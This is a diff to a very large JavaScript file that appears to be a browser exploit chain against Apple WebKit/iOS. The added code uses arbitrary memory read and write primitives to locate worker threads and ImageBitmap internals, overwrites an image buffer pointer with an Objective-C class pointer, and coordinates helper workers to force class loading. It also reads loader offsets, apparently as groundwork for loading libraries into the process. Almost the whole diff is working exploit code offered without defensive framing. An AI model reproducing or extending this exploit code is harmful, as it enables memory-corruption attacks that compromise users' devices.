@@ -18623,7 +18623,39 @@ async function main() {
       const data = p.read64(candidate + 0x20n);
       print(`loadObjcClass: ${label} cls=${candidate.hex()} isa=${isa.hex()} super=${superclass.hex()} cache=${cache.hex()} data=${data.hex()}`);
     }
+    async function closeClassLoadWorker(index) {
+      print(`loadObjcClass: helper close begin index=${index}`);
+      await new Promise((resolve, reject) => {
+        p.load_objc_class_resolve = resolve;
+        p.load_objc_class_reject = reject;
+        p.load_objc_class_expected_index = index;
+        self.postMessage({
+          type: 'trigger_load_objc_class',
+          index
+        });
+      });
+      print(`loadObjcClass: helper close done index=${index}`);
+    }
     print(`loadObjcClass: begin cls=${cls.hex()}`);
+    const helperIndex = p.class_load_worker_next || 0;
+    const helper = p.class_load_workers && p.class_load_workers[helperIndex];
+    if (helper) {
+      print(`loadObjcClass: using helper worker index=${helperIndex} id=${helper.id.hex()}`);
+      const wrappedBitmap = p.read64(helper.bitmap + 0x18n);
+      print(`loadObjcClass: helper wrappedBitmap=${wrappedBitmap.hex()}`);
+      const imagebuffer = p.read64(wrappedBitmap + 0x10n);
+      print(`loadObjcClass: helper imagebuffer=${imagebuffer.hex()}`);
+      print("loadObjcClass: helper class write begin");
+      p.write64(imagebuffer + 0x20n, cls);
+      print("loadObjcClass: helper class write done");
+      dumpClassCandidate("selected", cls);
+      dumpClassCandidate("plus0x80", cls + 0x80n);
+      dumpClassCandidate("minus0x80", cls - 0x80n);
+      p.class_load_worker_next = helperIndex + 1;
+      await closeClassLoadWorker(helperIndex);
+      return;
+    }
+    print("loadObjcClass: no helper worker available, using local bitmap");
     print("loadObjcClass: createImageBitmap begin");
     const bitmap = await createImageBitmap(canvas);
     print("loadObjcClass: createImageBitmap done");
@@ -18646,6 +18678,30 @@ async function main() {
   self.onmessage = async function (e) {
     const data = e.data;
     switch (data.type) {
+      case 'load_objc_class_done':
+        {
+          print(`loadObjcClass: done ack index=${data.index}`);
+          if (p.load_objc_class_resolve) {
+            const resolve = p.load_objc_class_resolve;
+            p.load_objc_class_resolve = null;
+            p.load_objc_class_reject = null;
+            resolve();
+          }
+          break;
+        }
+      case 'load_objc_class_failed':
+        {
+          const reason = data.message ? `: ${data.message}` : "";
+          const message = `loadObjcClass helper failed index=${data.index}${reason}`;
+          print(message);
+          if (p.load_objc_class_reject) {
+            const reject = p.load_objc_class_reject;
+            p.load_objc_class_resolve = null;
+            p.load_objc_class_reject = null;
+            reject(new Error(message));
+          }
+          break;
+        }
       case 'dlopen_workers_prepared':
         {
           print("dlopen prepared from worker");
@@ -18658,6 +18714,21 @@ async function main() {
           print(`contexts_length: ${contexts_length.hex()}`);
           const dlopen_workers = [];
           p.dlopen_workers = dlopen_workers;
+          const class_load_worker_ids = [
+            0xfffe000033333333n,
+            0xfffe000044444444n,
+            0xfffe000055555555n
+          ];
+          const class_load_workers = [];
+          p.class_load_workers = class_load_workers;
+          p.class_load_worker_next = 0;
+          function classLoadWorkerIndex(id) {
+            for (let i = 0; i < class_load_worker_ids.length; ++i) {
+              if (id === class_load_worker_ids[i])
+                return i;
+            }
+            return -1;
+          }
           function workerResolverCheckpoint(message) {
             print("worker resolver: " + message);
             sleep(10);
@@ -18692,8 +18763,11 @@ async function main() {
                   return null;
                 return { id, bitmap };
               }
-              if (id == 0xfffe000033333333n)
+              if (classLoadWorkerIndex(id) !== -1) {
+                if (!isLikelyReadablePointer(bitmap))
+                  return null;
                 return { id, bitmap };
+              }
               return null;
             }, p.worker_script_offset, p.worker_global_scope_wrapper_offset, true);
             if (!workerGlobal) {
@@ -18708,20 +18782,27 @@ async function main() {
                 id: id,
                 bitmap: bitmap
               });
-            } else if (id == 0xfffe000033333333n) {
-              p.sub_worker = {
+            } else if (classLoadWorkerIndex(id) !== -1) {
+              class_load_workers.push({
                 thread: thread,
-                id: id
-              };
+                id: id,
+                bitmap: bitmap,
+                index: classLoadWorkerIndex(id)
+              });
             }
-            if (dlopen_workers.length >= 2) {
-              workerResolverCheckpoint("found required dlopen workers");
+            if (dlopen_workers.length >= 2 && class_load_workers.length >= 3) {
+              workerResolverCheckpoint("found required dlopen/class-load workers");
               break;
             }
           }
           print(`dlopen workers found: ${dlopen_workers.length}`);
           if (dlopen_workers.length < 2)
             throw new Error("missing dlopen workers");
+          dlopen_workers.sort((a, b) => a.id < b.id ? -1 : (a.id > b.id ? 1 : 0));
+          class_load_workers.sort((a, b) => a.index < b.index ? -1 : (a.index > b.index ? 1 : 0));
+          print(`class load workers found: ${class_load_workers.length}`);
+          if (class_load_workers.length < 3)
+            throw new Error("missing class load workers");
           const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
           print(`defaultLoader: ${defaultLoader.hex()}`);
           if (defaultLoader) {
